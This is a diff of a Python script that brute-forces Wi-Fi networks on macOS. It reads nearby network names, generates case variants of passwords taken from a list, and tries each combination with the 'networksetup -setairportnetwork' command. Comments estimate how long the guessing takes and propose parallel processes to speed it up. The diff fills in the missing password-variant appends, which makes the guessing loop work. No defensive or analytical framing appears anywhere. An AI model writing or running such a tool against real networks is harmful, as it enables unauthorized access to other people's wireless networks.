@@ -17,7 +17,7 @@ def get_network_list():
 	net_array = []
 	net_names = []
 	for i in range(0,num_net):
-		#ssid
+		#ssid, name of ssid
 		_ssid = root[0][0][i][7].text
 		_ssid_name = root[0][0][i][32].text
 		_ssids.append(_ssid)
@@ -38,16 +38,19 @@ def get_password_array(password):
 	pass_array = []
 	#all lower
 	alllow_pass = password
-	pass_array.append()
+	pass_array.append(alllow_pass)
 	#all upper
 	allup_pass = _pass.upper()
-	pass_array.append()
+	pass_array.append(allup_pass)
 	#first upper
 	fup_pass = "".join(c.upper() if i in set([0]) else c for i, c in enumerate(_pass))
+	pass_array.append(fup_pass)
 	#every other lower
 	eol_pass = "".join(c.lower() if i % 2 == 0  else c for i, c in enumerate(_pass))
+	pass_array.append(eol_pass)
 	#every other upper
 	eou_pass = "".join(c.upper() if i % 2 == 0  else c for i, c in enumerate(_pass))
+	pass_array.append(eou_pass)
 
 	password_data.append(len(pass_array))
 	password_data.append(pass_array)
@@ -66,7 +69,9 @@ def process_element(itera,elem,networks):
 	for i in range(0,net_size):
 		for j in range(0,passwords[0]):
 			#execute command to login to netowrk, find out how long this process is, this will be the benchmark point/bottleneck (can  run concurently?)
-			#six ~seconds for succesful connect, 
+			# ~6-7 seconds for succesful connect? bail out after that.
+			# 5.8 min to run through 10 passwords from file in combination (50 passwords)
+			#if one can launch multiple processess (x), 5.8 min to run through 10 * x passwords from file in combination (50 * x) 
 			try:
 				net_con = 'networksetup -setairportnetwork Airport %s %s' % (net_names_array[i],passwords[1][j])
 				#or use call to check state or use popen to kill after 7 seconds
